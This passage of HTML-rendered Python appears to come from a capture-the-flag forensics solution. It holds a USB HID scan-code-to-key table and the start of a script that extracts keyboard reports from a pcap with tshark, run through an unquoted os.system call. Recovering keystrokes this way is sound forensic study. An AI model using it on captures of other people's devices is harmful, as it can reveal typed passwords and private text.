style=&quot;color:#86b300;&quot;&gt;&amp;quot;F&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0a&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;G&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0b&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;H&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0c&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;I&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0d&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;J&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0e&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;K&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0f&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;L&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;10&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;M&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;11&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;N&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;12&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;O&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;13&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;P&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;14&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Q&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;15&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;R&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;16&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;S&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;17&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;T&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;18&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;U&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;19&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;V&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1a&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;W&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1b&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;X&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1c&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Y&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1d&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Z&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1e&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;!&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1f&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;@&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;20&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;#&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;21&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;$&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;22&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;%&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;23&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;^&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;24&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;amp;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;25&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;*&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;26&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;27&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;28&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;RET&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;29&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;ESC&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;2a&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;DEL&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;2b&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;2c&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;SPACE&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;2d&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;_&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;2e&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;+&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;2f&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;{&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;30&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;}&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;31&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;|&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;32&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;NON&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;33&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;:&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;34&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;35&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;GA&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;36&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;37&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;38&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;?&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;39&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;CAP&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;3a&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;F1&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;3b&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;F2&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;3c&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;F3&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;3d&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;F4&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;3e&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;F5&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;3f&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;F6&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;40&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;F7&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;41&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;F8&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;42&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;F9&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;43&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;F10&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;44&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;F11&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;45&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;lt;F12&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# check argv
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(sys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;argv) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Usage : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;        python newsolve.py challenge.pcapng&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# get argv
&lt;&#x2F;span&gt;&lt;span&gt;    pcapFilePath &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;sys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;argv[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# get data of pcap
&lt;&#x2F;span&gt;&lt;span&gt;    os&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;system&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;tshark -r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt; -T fields -e usbhid.data -Y &amp;#39;usb.data_len == 8&amp;#39; &amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;(pcapFilePath&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;DataFileName))
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(DataFileName&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;r&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;f:
